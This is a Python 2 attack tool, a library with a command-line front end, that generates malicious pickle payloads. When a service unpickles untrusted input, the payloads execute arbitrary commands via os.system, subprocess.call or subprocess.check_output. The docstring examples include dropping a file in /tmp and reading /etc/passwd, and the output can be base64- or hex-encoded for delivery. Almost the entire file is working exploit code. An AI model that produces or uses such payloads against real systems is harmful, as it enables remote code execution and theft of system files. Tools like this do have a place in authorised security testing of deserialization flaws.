#!/usr/bin/env python

# Python library/command line tool for creating malicious pickles to attack
# systems that unpickle arbitrary user provided content


class BadPickle():
    '''
    Creates malicious pickle strings
    
    
    Usage: 
    
    Different exploit methods are available depending on ptype setting.
    
    Examples:
    
    The following runs a command and puts the return code in the pickle output.
    
    Uses os.system(). Should work fairly universally.
    
    -----
    > bp = BadPickle('touch /tmp/pwned', ptype='system')
    > bpString = bp.sploit()
    -----
    
    OR
    
    The following runs a command with the command stdout in the pickle output.
    
    Uses subprocess.check_output(). Only works on python 2.7+. 
    Generates CalledProcessError on non zero return code.
    
    -----
    > bp = BadPickle(['cat', '/etc/passwd'], ptype='check_output')
    > bpString = bp.sploit()
    -----
    
    OR
    
    The following runs a command with the command stdout in the pickle output.
    
    Uses subprocess.call().
    
    -----
    > bp = BadPickle(['cat', '/etc/passwd'], ptype='subprocess')
    > bpString = bp.sploit()
    -----    
    '''
    
    import pickle
    
    def __init__(self, cmd, ptype='check_output'):
        '''Initialise the object.
        
        ptype is the type of bad pickle to create.
        * check_output (default) uses subprocess.check_output. Output is command
          stdout.  Only works on python 2.7+
        * system uses os.system. Output is command return code.
        * subprocess uses subprocess.call. Output is command
          return code
        
        cmd is the command data. It should be:
        * A string for ptype 'system'. 
        * A list of strings for ptype check_output or subprocess
            
        '''
        self.ptype = ptype
        self.c = cmd
        if ptype == 'check_output':
            if type(self.c) != list:
                raise TypeError('Input value must be list')    
        elif ptype == 'system':
            if type(self.c) != str:
                raise TypeError('Input value must be string')
        elif ptype == 'subprocess':
            if type(self.c) != list:
                raise TypeError('Input value must be list')            
        

    def sploit(self):
        '''Return the malicious pickled string'''
        if self.ptype == 'check_output':
            return self.pickle.dumps(self.CheckOutputObject(self.c))
        elif self.ptype == 'subprocess':
            return self.pickle.dumps(self.SubprocessCall(self.c))
        elif self.ptype == 'system':
            return self.pickle.dumps(self.SystemObject(self.c))


    
    # outputs stdout of process as pickle output
    # this will generate CalledProcessError for processes with non 0 exit status
    # only works on python 2.7+
    # instantiate with list of process name and params
    class CheckOutputObject(object):
        '''Bad pickle object using subprocess.check_output'''
        subprocess = __import__('subprocess')
        
        def __init__(self, c):
            self.c = c
     
        def __reduce__(self):
            return (self.subprocess.check_output,(self.c,))


    class SubprocessCall(object):
        '''Bad pickle object using subprocess.call'''
        subprocess = __import__('subprocess')
        
        def __init__(self, c):
            self.c = c
     
        def __reduce__(self):
            return (self.subprocess.call, (self.c,)) 


    # should work fairly universally, but only process exit code provided as output
    # instantiate with single string "shell" command
    class SystemObject(object):
        '''Bad pickle object using os.system'''
        os = __import__('os')
        
        def __init__(self, c):
            self.c = c
     
        def __reduce__(self):
            return (self.os.system, (self.c,)) 
            
            



if __name__ == '__main__':
    
    from optparse import OptionParser
    parser = OptionParser(usage='%prog [options] <command params>')
    parser.add_option('-r', '--raw', dest='raw', action='store_true', help='no encoding, raw output')
    parser.add_option('-x', '--hex', dest='hex', action='store_true', help='encode output using ASCII hex')
    parser.add_option('-b', '--base64', dest='base64', action='store_true', help='encode output using Base64 (default)')
    parser.add_option('-s', '--system', dest='system', action='store_true', help='use os.system. Command will be a single string.')
    parser.add_option('-c', '--checkoutput', dest='checkoutput', action='store_true', help='use subprocess.check_output (default). Command will be a list of command name and params.')
    parser.add_option('-p', '--subprocess', dest='subprocess', action='store_true', help='use subprocess.call. Command will be a list of command name and params.')
    opts, args = parser.parse_args()

    if len(args) == 0:
        parser.print_help()
        parser.exit()
    else:
        if opts.system and (opts.checkoutput or opts.subprocess):
            print 'Cannot use multiple exploit methods. Pick one'
            parser.exit()
        elif opts.system:
            d = args[0]
            pt = 'system'
        elif opts.subprocess:
            pt = 'subprocess'
            d = args
        else:
            pt = 'check_output'
            d = args


        if (opts.raw and (opts.base64 or opts.hex)) or (opts.hex and (opts.base64 or opts.raw)):
            print 'Multiple encoder options set. Pick one'
            parser.exit()
        elif opts.raw:
            encoder=str
        elif opts.hex:
            from binascii import hexlify
            encoder=hexlify
        else:
            from base64 import b64encode
            encoder=b64encode
            

        bp = BadPickle(d, ptype=pt)
        print encoder(bp.sploit())
